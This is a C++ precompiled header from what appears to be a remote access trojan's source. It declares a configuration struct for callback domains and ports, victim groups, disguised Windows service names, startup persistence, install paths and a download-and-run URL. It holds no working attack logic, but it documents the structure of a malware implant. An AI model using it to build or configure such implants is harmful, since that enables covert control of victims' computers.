// stdafx.h : include file for standard system include files,
//  or project specific include files that are used frequently, but
//      are changed infrequently
//

#if !defined(AFX_STDAFX_H__02BAC0DC_8949_4F56_A229_4DDAABB1F28A__INCLUDED_)
#define AFX_STDAFX_H__02BAC0DC_8949_4F56_A229_4DDAABB1F28A__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

// Insert your headers here
#define WIN32_LEAN_AND_MEAN		// Exclude rarely-used stuff from Windows headers

#ifdef _DEBUG
//#include <vld.h>
#endif // _DEBUG

#define _WIN32_WINNT 0x0501
#include <afxtempl.h>
#include <windows.h>
#include <map>
#include "sal.h"

//配置信息结构体
struct MODIFY_DATA
{
	TCHAR szDns1[300];      //上线地址1
	TCHAR szDns2[300];      //上线地址2
	DWORD dwPort1;          //上线端口1
	DWORD dwPort2;          //上线端口2
	TCHAR szGroup[50];      //上线分组
	TCHAR szVersion[32];    //上线版本
	TCHAR SerName[100];     //服务名称
	TCHAR Serdisplay[128];  //显示名称
	TCHAR Serdesc[256];     //服务描述
	TCHAR szGetGroup[256];  //分组唯一标识
	BOOL  bLanPenetrate;    //是否使用了内网穿透
	BOOL  bService;         //是否是服务启动
	BOOL  bRuns;            //是否是启动目录启动
	BOOL  bRunOnce;         //是否为绿色安装
	TCHAR ReleasePath[100]; //安装途径
	TCHAR ReleaseName[50];  //安装名称
	WORD  Dele_zd;          //安装增大
	WORD  FileAttribute;    //文件属性
	BOOL Dele_Kzj;          //离线记录
	TCHAR szDownRun[512];   //下载运行地址
};
// TODO: reference additional headers your program requires here
extern WORD    InstallMode;    // 运行模式
extern UINT    ConnectType;    // 上线类型
extern LPCTSTR lpConnInfos[2]; // 上线域名
extern DWORD   dwConnPorts[2]; // 上线端口
extern LPTSTR  lpszUserSid;    // 活动帐号
extern char*   lpDriverName;   // 驱动名称
extern char *scEXEName; //接入的参数

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_STDAFX_H__02BAC0DC_8949_4F56_A229_4DDAABB1F28A__INCLUDED_)
